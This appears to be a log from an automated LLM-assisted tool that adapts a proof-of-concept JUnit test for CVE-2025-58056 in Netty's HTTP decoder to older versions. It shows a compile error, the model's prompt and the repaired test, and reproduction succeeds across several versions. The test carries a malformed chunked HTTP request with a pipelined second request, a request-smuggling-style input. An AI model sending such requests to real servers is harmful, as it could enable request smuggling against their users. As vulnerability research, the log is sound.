[INFO] Changes detected - recompiling the module!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/target/test-classes
[INFO] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java: /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java uses unchecked or unsafe operations.
[INFO] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java: Recompile with -Xlint:unchecked for details.
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,43] AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,123] <anonymous com.example.Testcase1$1> is not abstract and does not override abstract method writeInbound0(java.lang.Object) in io.netty.channel.embedded.AbstractEmbeddedChannel
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.864 s
[INFO] Finished at: 2025-09-25T06:06:09Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,43] AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java:[38,123] <anonymous com.example.Testcase1$1> is not abstract and does not override abstract method writeInbound0(java.lang.Object) in io.netty.channel.embedded.AbstractEmbeddedChannel
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.example</groupId>
  <artifactId>demo</artifactId>
  <version>1.0-SNAPSHOT</version>

  <name>demo</name>
  <!-- FIXME change it to the project's website -->
  <url>http://www.example.com</url>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>1.8</maven.compiler.target>
  </properties>

  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.10</version>
      <scope>test</scope>
    </dependency>
    
    <dependency>
        <groupId>io.netty</groupId>
        <artifactId>netty-codec-http</artifactId>
        <version>4.0.0.CR3</version>
    </dependency>
        
  </dependencies>

  <build>
    <pluginManagement><!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) -->
      <plugins>
        <!-- clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle -->
        <plugin>
          <artifactId>maven-clean-plugin</artifactId>
          <version>3.1.0</version>
        </plugin>
        <!-- default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging -->
        <plugin>
          <artifactId>maven-resources-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-compiler-plugin</artifactId>
          <version>3.8.0</version>
        </plugin>
        <plugin>
          <artifactId>maven-surefire-plugin</artifactId>
          <version>2.22.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-jar-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-install-plugin</artifactId>
          <version>2.5.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-deploy-plugin</artifactId>
          <version>2.8.2</version>
        </plugin>
        <!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle -->
        <plugin>
          <artifactId>maven-site-plugin</artifactId>
          <version>3.7.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-project-info-reports-plugin</artifactId>
          <version>3.0.0</version>
        </plugin>
      </plugins>
    </pluginManagement>
  </build>
</project>

[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[Adapter] Grouped Errors: {'AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package |': [{'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 38, 'column': 43, 'message': 'AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package', 'symbol': None, 'location': None, 'code_line': '        AbstractEmbeddedChannel channel = new AbstractEmbeddedChannel(Unpooled.messageBuffer(), new HttpRequestDecoder()) {};'}], '<anonymous com.example.Testcase1$1> is not abstract and does not override abstract method writeInbound0(java.lang.Object) in io.netty.channel.embedded.AbstractEmbeddedChannel |': [{'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 38, 'column': 123, 'message': '<anonymous com.example.Testcase1$1> is not abstract and does not override abstract method writeInbound0(java.lang.Object) in io.netty.channel.embedded.AbstractEmbeddedChannel', 'symbol': None, 'location': None, 'code_line': '        AbstractEmbeddedChannel channel = new AbstractEmbeddedChannel(Unpooled.messageBuffer(), new HttpRequestDecoder()) {};'}]}
[LLMClient] Tokens used: 188 (prompt), 8 (completion), 196 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 4.0.0.CR3: 

Error: AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package, None, None 

The test executes as expected in 4.0.0.CR4 

Error code:         AbstractEmbeddedChannel channel = new AbstractEmbeddedChannel(Unpooled.messageBuffer(), new HttpRequestDecoder()) {}; 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
AbstractEmbeddedChannel;HttpRequestDecoder
[96m[ErrorManager] Extracted key entities: ['AbstractEmbeddedChannel', 'HttpRequestDecoder'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 38, 'column': 43, 'message': 'AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package', 'symbol': None, 'location': None, 'code_line': '        AbstractEmbeddedChannel channel = new AbstractEmbeddedChannel(Unpooled.messageBuffer(), new HttpRequestDecoder()) {};'} with cause: ['AbstractEmbeddedChannel', 'HttpRequestDecoder'][0m
[96m[Adapter] Related diffs for error: [(415, 4.0), (416, 4.0), (419, 4.0), (448, 4.0), (0, 0.0)][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package | cause: ['AbstractEmbeddedChannel', 'HttpRequestDecoder'][0m
[96m[RepairModule] Trying best diff #415 with score 4.00[0m
[LLMClient] Tokens used: 902 (prompt), 464 (completion), 1366 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 4.0.0.CR3:io.netty:netty-codec-http.
This test file compiles and runs successfully in 4.0.0.CR4.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 4.0.0.CR4 to 4.0.0.CR3.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: AbstractEmbeddedChannel(java.lang.Object,io.netty.channel.ChannelHandler...) is not public in io.netty.channel.embedded.AbstractEmbeddedChannel; cannot be accessed from outside package, symble: None, location: None

### Error Position:
        AbstractEmbeddedChannel channel = new AbstractEmbeddedChannel(Unpooled.messageBuffer(), new HttpRequestDecoder()) {};

### Related Diff:
Operation: MODIFIED, File: codec-http/src/test/java/io/netty/handler/codec/http/HttpInvalidMessageTest.java, Hunk: @@ -32,7 +32,7 @@ public class HttpInvalidMessageTest {

     @Test
     public void testRequestWithBadInitialLine() throws Exception {
+        EmbeddedByteChannel ch = new EmbeddedByteChannel(new HttpRequestDecoder());
-        EmbeddedChannel ch = new EmbeddedChannel(new HttpRequestDecoder());
         ch.writeInbound(Unpooled.copiedBuffer("GET / HTTP/1.0 with extra\r\n", CharsetUtil.UTF_8));
         HttpRequest req = (HttpRequest) ch.readInbound();
         DecoderResult dr = req.getDecoderResult();

### Test File Content:
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.AbstractEmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        AbstractEmbeddedChannel channel = new AbstractEmbeddedChannel(Unpooled.messageBuffer(), new HttpRequestDecoder()) {};
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.getDecoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding") && "chunked".equals(request.headers().get("Transfer-Encoding")));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.getDecoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}



[LLMClient] Response: 
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedByteChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedByteChannel channel = new EmbeddedByteChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.getDecoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding") && "chunked".equals(request.headers().get("Transfer-Encoding")));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.getDecoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.0.CR3/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR3...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[RepairModule] Repair success![0m
[92m[RepairModule] Repair success with best diff![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR3...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Adapter] Adaptation from 4.0.0.CR4 to 4.0.0.CR3 successful.[0m
[Adapt] âœ“ Completed: True
[96m[Adapter] Adaptation complete. Retesting exploit on 4.0.0.CR3...[0m
[92m[Executor] Adaptation + reproduction successful on 4.0.0.CR3[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR3[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.CR2[0m
[96m[Selector] Closest reproduced version: 4.0.0.CR3 at index 13[0m
[96m[Adapter] Trying next closest version: 4.0.0.CR2[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR3/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR2/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.CR2 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR2/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.CR2 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR2/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.CR2...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR2...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.CR2[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR2[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.CR1[0m
[96m[Selector] Closest reproduced version: 4.0.0.CR2 at index 12[0m
[96m[Adapter] Trying next closest version: 4.0.0.CR1[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR2/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR1/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.CR1 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR1/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.CR1 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.CR1/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.CR1...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.CR1...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.CR1[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR1[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.Beta3[0m
[96m[Selector] Closest reproduced version: 4.0.0.CR1 at index 11[0m
[96m[Adapter] Trying next closest version: 4.0.0.Beta3[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.CR1/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Beta3/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.Beta3 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Beta3/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.Beta3 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Beta3/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.Beta3...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.Beta3...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.Beta3[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.Beta3[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.Beta2[0m
[96m[Selector] Closest reproduced version: 4.0.0.Beta3 at index 10[0m
[96m[Adapter] Trying next closest version: 4.0.0.Beta2[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.Beta3/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Beta2/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.Beta2 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Beta2/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.Beta2 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Beta2/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.Beta2...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.Beta2...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.Beta2[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.Beta2[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.0.Beta1[0m
[96m[Selector] Closest reproduced version: 4.0.0.Beta2 at index 9[0m
[96m[Adapter] Trying next closest version: 4.0.0.Beta1[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.Beta2/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Beta1/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.0.Beta1 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Beta1/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.0.Beta1 in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.0.Beta1/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.0.Beta1...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.0.Beta1...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.0.Beta1[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.0.Beta1[0m
[93m[Selector] No pending versions available.[0m
[91m[Main] No suitable version found for further adaptation. Stopping.[0m
[1m[Main] === Adaptation process complete ===[0m
[92m[Main] Total reproduced versions: 227[0m